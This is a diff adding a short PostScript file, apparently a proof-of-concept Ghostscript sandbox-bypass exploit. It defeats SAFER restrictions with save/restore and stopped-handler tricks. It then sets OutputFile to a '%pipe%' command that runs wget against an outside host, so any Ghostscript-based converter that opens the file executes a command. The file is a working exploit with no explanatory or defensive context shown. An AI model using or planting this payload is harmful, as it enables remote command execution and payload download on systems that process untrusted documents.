@@ -1,0 +1,9 @@
+%!PS
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%wget http://c.q2.re/bb) currentdevice putdeviceprops
+
